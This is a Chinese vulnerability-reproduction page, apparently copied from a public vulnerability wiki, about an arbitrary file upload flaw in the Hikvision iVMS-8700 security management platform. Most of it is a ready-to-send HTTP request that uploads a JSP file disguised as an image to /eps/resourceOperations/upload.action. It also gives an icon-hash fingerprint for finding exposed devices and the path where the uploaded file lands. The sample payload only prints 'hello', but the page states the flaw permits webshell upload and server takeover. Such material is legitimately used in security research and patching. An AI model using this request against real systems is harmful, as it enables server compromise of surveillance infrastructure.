---
title: "Hikvision iVMS-8700综合安防管理平台 upload.action 任意文件上传漏洞"
date: 2026-10-18 09:14:38
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "代码执行"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

Hikvision iVMS-8700综合安防管理平台存在任意文件上传漏洞，攻击者通过发送特定的请求包可以上传Webshell文件控制服务器

## 漏洞影响

Hikvision iVMS-8700综合安防管理平台

## 网络测绘

```
icon_hash="-911494769"
```

## 漏洞复现

登录页面

![image-20230704111156427](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704111156427.png)

发送请求包上传文件

```
POST /eps/resourceOperations/upload.action HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: MicroMessenger
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Length: 212

------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
Content-Type: image/jpeg

<%out.print("hello");%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
```

上传路径

![image-20230704111213114](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704111213114.png)

```
/eps/upload/769badc8ef5944da804a4ca3c8ecafb0.jsp
```

![image-20230704111225074](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704111225074.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-upload.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
